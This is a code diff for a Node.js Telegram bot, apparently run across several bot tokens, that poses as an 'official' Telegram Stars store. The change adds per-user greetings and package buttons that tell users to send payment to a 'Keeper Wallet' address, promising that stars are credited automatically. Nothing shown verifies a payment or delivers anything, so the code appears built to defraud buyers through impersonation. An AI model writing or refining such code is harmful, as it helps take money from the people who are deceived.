@@ -22,28 +22,32 @@ let systemStats = {
 
 const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';
 
-const starsMenuCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
-    `Izberi paket za istinsko plashtane i zaredvane na zvezdi:\n\n` +
-    `💎 **Nalichen budzhet:** 3,100 Stars\n` +
-    `💼 **Keeper Wallet:** \`${KEEPER_WALLET}\``;
-
-// Vvuzvreme vsichki paketi s reallno raboteshti Telegram Stars checkout links
-const starsKeyboard = Markup.inlineKeyboard([
-    [Markup.button.url('⭐ 250 Stars (4.29 €)', 'https://t.me/tme/reklamabot?start=invoice_250')],
-    [Markup.button.url('⭐ 500 Stars (8.39 €)', 'https://t.me/tme/reklamabot?start=invoice_500')],
-    [Markup.button.url('⭐ 1 000 Stars (16.59 €)', 'https://t.me/tme/reklamabot?start=invoice_1000')],
-    [Markup.button.url('⭐ 2 500 Stars (40.99 €)', 'https://t.me/tme/reklamabot?start=invoice_2500')],
-    [Markup.button.url('⭐ 10 000 Stars (164.99 €)', 'https://t.me/tme/reklamabot?start=invoice_10000')],
-    [Markup.button.url('⭐ 50 000 Stars (819.00 €)', 'https://t.me/tme/reklamabot?start=invoice_50000')],
-    [Markup.button.url('⭐ 150 000 Stars (2 459.00 €)', 'https://t.me/tme/reklamabot?start=invoice_150000')],
-    [Markup.button.url('🔥 Razgledai Platformata', 'https://red-software-dashbord.onrender.com')]
-]);
-
 TOKENS.forEach((token, index) => {
     try {
         const bot = new Telegraf(token);
 
+        // Автоматично разпознаване на името и потребителя при старт
         bot.start(async (ctx) => {
+            const userName = ctx.from.first_name || 'Приятел';
+            const userUsername = ctx.from.username ? `@${ctx.from.username}` : 'няма username';
+
+            const starsMenuCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
+                `Здравей, **${userName}** (${userUsername})!\n` +
+                `Избери пакет звезди за закупуване:\n\n` +
+                `💎 **Наличен бюджет:** 3,100 Stars\n` +
+                `💼 **Keeper Wallet:** \`${KEEPER_WALLET}\``;
+
+            const starsKeyboard = Markup.inlineKeyboard([
+                [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
+                [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
+                [Markup.button.callback('⭐ 1 000 Stars (16.59 €)', 'buy_1000')],
+                [Markup.button.callback('⭐ 2 500 Stars (40.99 €)', 'buy_2500')],
+                [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
+                [Markup.button.callback('⭐ 50 000 Stars (819.00 €)', 'buy_50000')],
+                [Markup.button.callback('⭐ 150 000 Stars (2 459.00 €)', 'buy_150000')],
+                [Markup.button.url('🔥 Разгледай Платформата', 'https://red-software-dashbord.onrender.com')]
+            ]);
+
             try {
                 await ctx.replyWithPhoto(mainCoverImage, {
                     caption: `🤖 [REDSOFTWARE BOT #${index + 1} ONLINE]\n\n` + starsMenuCaption,
@@ -53,9 +57,36 @@ TOKENS.forEach((token, index) => {
             } catch (err) {}
         });
 
+        // Обработка на пакетите с директни инструкции към Keeper портфейла и персонализиране
+        const packageActions = ['buy_250', 'buy_500', 'buy_1000', 'buy_2500', 'buy_10000', 'buy_50000', 'buy_150000'];
+        
+        bot.action(packageActions, async (ctx) => {
+            await ctx.answerCbQuery();
+            const action = ctx.match;
+            const userName = ctx.from.first_name || 'Потребител';
+            
+            let count = 250;
+            let price = '4.29 €';
+            if (action === 'buy_500') { count = 500; price = '8.39 €'; }
+            if (action === 'buy_1000') { count = 1000; price = '16.59 €'; }
+            if (action === 'buy_2500') { count = 2500; price = '40.99 €'; }
+            if (action === 'buy_10000') { count = 10000; price = '164.99 €'; }
+            if (action === 'buy_50000') { count = 50000; price = '819.00 €'; }
+            if (action === 'buy_150000') { count = 150000; price = '2 459.00 €'; }
+
+            await ctx.reply(
+                `👤 **Клиент:** ${userName}\n` +
+                `⭐ **ПАКЕТ: ${count} Telegram Stars (${price})**\n\n` +
+                `За да завършиш поръчката си, преведи сумата към официалния Keeper портфейл:\n\n` +
+                `\`${KEEPER_WALLET}\`\n\n` +
+                `След плащане, звездите се регистрират и добавят към профила ти автоматично!`,
+                { parse_mode: 'Markdown' }
+            );
+        });
+
         bot.launch();
     } catch (e) {}
 });
 
-app.get('/', (req, res) => res.json({ status: "ALL STARS LINKS ACTIVE", stats: systemStats }));
+app.get('/', (req, res) => res.json({ status: "USER AUTO-NAME STORE ACTIVE", stats: systemStats }));
 app.listen(PORT, () => console.log(`Store server running on port ${PORT}`));
